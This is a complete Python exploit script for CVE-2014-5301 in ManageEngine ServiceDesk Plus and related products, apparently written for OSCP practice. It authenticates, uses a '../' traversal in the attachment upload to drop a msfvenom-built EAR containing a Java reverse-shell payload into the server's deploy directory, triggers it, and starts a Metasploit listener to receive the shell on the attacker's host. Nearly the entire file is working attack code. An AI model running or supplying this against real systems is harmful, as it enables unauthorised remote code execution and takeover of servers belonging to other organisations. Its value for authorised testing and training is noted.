#!/usr/bin/env python2
#  -*- coding: utf-8 -*- #######################################################################################
#█▀▄▀█   ▄▀  █▀▄▀█    ▄▄▄▄▄   ██▄   █ ▄▄  █       ▄      ▄▄▄▄▄   █▄▄▄▄ ▄█▄    ▄███▄                            #
#█ █ █ ▄▀    █ █ █   █     ▀▄ █  █  █   █ █        █    █     ▀▄ █  ▄▀ █▀ ▀▄  █▀   ▀                           #
#█ ▄ █ █ ▀▄  █ ▄ █ ▄  ▀▀▀▀▄   █   █ █▀▀▀  █     █   █ ▄  ▀▀▀▀▄   █▀▀▌  █   ▀  ██▄▄                             #
#█   █ █   █ █   █  ▀▄▄▄▄▀    █  █  █     ███▄  █   █  ▀▄▄▄▄▀    █  █  █▄  ▄▀ █▄   ▄▀                          #
#█   ███     █             ███▀   █        ▀ █▄ ▄█              █   ▀███▀  ▀███▀                               #
#▀           ▀                      ▀          ▀▀▀              ▀                                              #
#                                                                                                              #
# DATE                                                                                                         #
# 14/02/2019                                                                                                   #
#                                                                                                              #
# DESCRIPTION                                                                                                  #
# CVE-2014-5301 This module exploits a directory traversal vulnerability in ManageEngine                       #
#ServiceDesk, AssetExplorer, SupportCenter and IT360 when uploading attachment files.                          #
#The JSP that accepts the upload does not handle correctly '../' sequences, which can be abused to write       #
#to the file system. Authentication is needed to exploit this vulnerability, but this module will attempt to   #
#login using the default credentials for the administrator and guest accounts. Alternatively, you can provide  #
#a pre-authenticated cookie or a username / password. For IT360 targets, enter the RPORT of the ServiceDesk    #
#instance (usually 8400). All versions of ServiceDesk prior v9 build 9031 (including MSP but excluding v4),    #
#AssetExplorer, SupportCenter and IT360 (including MSP) are vulnerable. At the time of release of this         #
#module, only ServiceDesk v9 has been fixed in build 9031 and above. This module has been been tested          #
#successfully in Windows and Linux on several versions.                                                        #
#                                                                                                              #
# Notes: Got heap error message when did use a non staged payload. That is why we still use msf! However this  #
# is allowed on OSCP as long as meterpreter is not in use.                                                     #
#                                                                                                              #
# nighter - http://nighter.se/                                                                                 #
#                                                                                                              #
################################################################################################################


import requests
import signal
import os
import sys
import random
import shutil
import string
import time

from multiprocessing import Process

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print("\nYou pressed Ctrl+C!")
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


def random_string_generator(size=8, chars=string.ascii_lowercase + string.ascii_uppercase):
    return ''.join(random.choice(chars) for _ in range(size))


# Random name
EAR_APP_BASE = random_string_generator()


def build_ear():

    ear_app_base = EAR_APP_BASE
    current_dir = os.getcwd()

    try:
        os.makedirs('/tmp/%s' % ear_app_base)
        os.makedirs('/tmp/%s/META-INF' % ear_app_base)
    except:
        pass

    print("[+] Build ear payload: /tmp/%s.ear" % ear_app_base)
    os.chdir('/tmp/%s' % ear_app_base)
    payload = 'msfvenom -a x86 -p java/shell/reverse_tcp lhost=%s lport=%s -f war -o %s.war' % (LHOST, LPORT, ear_app_base)
    os.system(payload)

    app_xml = '<?xml version=\"1.0\" encoding=\"UTF-8\"?>'
    app_xml += '<application>'
    app_xml += '<display-name>%s</display-name>' % ear_app_base
    app_xml += '<module><web><web-uri>%s.war</web-uri>' % ear_app_base
    app_xml += "<context-root>/%s</context-root></web></module></application>" % ear_app_base

    with open('/tmp/%s/META-INF/application.xml' % ear_app_base, 'w') as f:
        f.write(app_xml)

    # Zipfile
    os.chdir('/tmp')
    shutil.make_archive(ear_app_base, 'zip', '/tmp/%s' % ear_app_base)
    os.rename(ear_app_base + '.zip', ear_app_base + '.ear')

    # cleanup
    if len(ear_app_base) == 0:
        return
    os.system('rm -rf /tmp/%s' % ear_app_base)
    return '/tmp/%s.ear' % ear_app_base


def authenticate():

    # Not sure if it is needed but add just in case.
    jsessionid = '8BC85456BCE3AA78DB9E08258883A032'

    session = requests.Session()
    session.get('%s/' % URL)

    headers = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0',
               'Content-Type': 'application/x-www-form-urlencoded'}

    login_data = "j_username=%s&\
j_password=%s&\
LDAPEnable=false&\
hidden=Select+a+Domain&hidden=For+Domain&AdEnable=false&\
DomainCount=0&LocalAuth=No&LocalAuthWithDomain=No&dynamicUserAddition_status=true&\
localAuthEnable=true&logonDomainName=-1&loginButton=Login" % (USERNAME, PASSWORD)

    session.post('%s/j_security_check;jsessionid=%s' % (URL, jsessionid), data=login_data, headers=headers, allow_redirects=True)
    session.get('%s/MySchedule.do' % URL)
    return session


def upload_payload(session):

    print("[+] Upload payload")
    upload_path = '../../server/default/deploy'
    payload_file = build_ear()

    with open(payload_file, 'rb') as payload:
        session.post('%s/common/FileAttachment.jsp' % URL, data={'module': upload_path, 'att_desc': ''}, files={'filePath': payload})

    return session

def exploit():

    time.sleep(5)
    session = authenticate()
    session = upload_payload(session)
    time.sleep(5)
    print("[+] Exploit")
    session.get("%s/%s" % (URL, EAR_APP_BASE))


def start_listener():

    print("[+] Start listener")
    listener = "msfconsole -q -x 'use multi/handler;set PAYLOAD java/shell/reverse_tcp;set LHOST %s;set LPORT %s;run'" % (LHOST, LPORT)
    os.system(listener)


if __name__ == '__main__':

    if len(sys.argv) != 6:
        print("""
█▀▄▀█   ▄▀  █▀▄▀█    ▄▄▄▄▄   ██▄   █ ▄▄  █       ▄      ▄▄▄▄▄   █▄▄▄▄ ▄█▄    ▄███▄   
█ █ █ ▄▀    █ █ █   █     ▀▄ █  █  █   █ █        █    █     ▀▄ █  ▄▀ █▀ ▀▄  █▀   ▀  
█ ▄ █ █ ▀▄  █ ▄ █ ▄  ▀▀▀▀▄   █   █ █▀▀▀  █     █   █ ▄  ▀▀▀▀▄   █▀▀▌  █   ▀  ██▄▄    
█   █ █   █ █   █  ▀▄▄▄▄▀    █  █  █     ███▄  █   █  ▀▄▄▄▄▀    █  █  █▄  ▄▀ █▄   ▄▀ 
   █   ███     █             ███▀   █        ▀ █▄ ▄█              █   ▀███▀  ▀███▀   
  ▀           ▀                      ▀          ▀▀▀              ▀                   
CVE-2014-5301 - ManageEngine ServiceDesk Plus Authenticated File Upload Rce Exploit
[nighter@nighter.se]
    """)
        print("Usage: %s <URL> <LHOST> <LPORT> <USERNAME> <PASSWORD>" % (sys.argv[0]))
        print("EXAMPLE: ./manageengine_sdplus_rce.py 'http://10.11.1.xxx:8080' 10.11.0.xxx 4444 <USERNAME> <PASSWORD>\n")
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]
    USERNAME = sys.argv[4]
    PASSWORD = sys.argv[5]

    print("[+] LHOST = %s" % LHOST)
    print("[+] LPORT = %s" % LPORT)

    # Run exploit Async
    p = Process(target=exploit)
    p.start()

    start_listener()


